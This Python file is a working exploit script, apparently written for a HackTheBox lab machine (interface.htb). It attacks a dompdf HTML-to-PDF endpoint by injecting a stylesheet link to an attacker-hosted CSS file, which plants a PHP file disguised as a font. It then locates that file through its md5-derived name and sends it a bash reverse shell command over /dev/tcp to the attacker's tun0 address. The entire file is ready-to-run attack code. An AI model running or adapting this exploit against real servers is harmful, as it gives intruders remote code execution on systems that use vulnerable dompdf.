import hashlib
import http.server
import requests
import argparse
import socketserver
import netifaces
import threading
import signal
from colorama import Style, Fore

proxies = {"http": "http://127.0.0.1:8080"}


def serve_file() -> None:
    handler = http.server.SimpleHTTPRequestHandler
    global httpd
    httpd = socketserver.TCPServer(("", 80), handler)
    print("Serving Files on Port 80")
    httpd.serve_forever()


def upload_file(host: str, lhost: str, proxy: bool) -> None:
    data = {
        "html": f"title=<link rel=stylesheet href='http://{lhost}:80/exploit.css'>"
    }
    r = requests.post(f"{host}/api/html2pdf", json=data, proxies=proxies if proxy else None)
    if r.status_code == 200:
        print(Fore.GREEN + "[+] File Successfully Uploaded" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] File Upload Failed :\"(" + Style.RESET_ALL)


def get_shell(host: str, lhost: str, lport: str, proxy: bool) -> None:
    upload_file(host, lhost, proxy)
    url = f"http://{lhost}:80/exploit_font.php".encode('utf-8')
    md5_sum = hashlib.md5(url).hexdigest()
    data = {
        "cmd": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    }
    print(Fore.GREEN + "[+] Sending Reverse Shell" + Style.RESET_ALL)
    requests.post(
        f"http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_{md5_sum}.php",
        timeout=2, data=data, proxies=proxies if proxy else None)


def signal_handler():
    global httpd
    httpd.shutdown()
    print("Server Stopped")
    exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', help='url of the host', type=str, required=True)
    parser.add_argument('-p', help='port to receive reverse shell on', type=str, required=True)
    args = parser.parse_args()

    t = threading.Thread(target=serve_file)
    t.daemon = True
    try:
        t.start()
        tun0 = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
        # Change proxy=True if you wanna run traffic through the burpsuite
        get_shell(args.u, tun0, args.p, proxy=False)
    except requests.exceptions.Timeout:
        httpd.shutdown()
        exit(0)
    except KeyboardInterrupt:
        httpd.shutdown()
        exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
